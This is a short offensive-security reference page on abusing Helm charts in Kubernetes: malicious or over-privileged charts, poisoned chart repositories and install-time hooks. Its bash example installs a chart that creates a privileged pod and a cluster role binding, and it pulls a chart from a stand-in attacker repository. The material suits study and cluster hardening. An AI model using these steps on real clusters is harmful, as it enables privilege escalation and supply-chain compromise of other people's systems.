---
title: "Helm chart abuse: deploying through a malicious or over-privileged chart"
description: "Abusing Helm to run attacker workloads: installing a malicious or over-privileged chart, tampering with a chart in a repository so installs pull attacker content, or exploiting chart templating and hooks to create privileged pods and RBAC during a release."
keywords:
  - helm chart
  - chart repository
  - chart hooks
  - over-privileged chart
  - kubernetes supply chain
---

# Helm chart abuse

Helm renders templates into Kubernetes objects and applies them with the installer's permissions. A chart can declare anything: privileged pods, hostPath volumes, cluster role bindings. Installing a malicious chart, tampering with one in a repository, or abusing chart hooks runs attacker-chosen objects through a trusted release.

```bash
# A chart that creates a privileged, host-mounting workload and a broad binding
helm install audit ./chart        # templates expand to privileged pod + clusterrolebinding
helm repo add x https://attacker/charts && helm install y x/legit   # poisoned repo
```

## Exploitation notes

- The objects a chart creates run with the installer's rights, so a CI or admin installing a crafted chart grants it their power.
- Chart hooks run jobs at install or upgrade time, a convenient place to hide a one-shot escalation.
- Tampering with an untrusted or unverified chart repository poisons every install that pulls from it.

## References

- [Helm security](https://helm.sh/docs/topics/securing_installation/)
- [Helm: chart hooks](https://helm.sh/docs/topics/charts_hooks/)
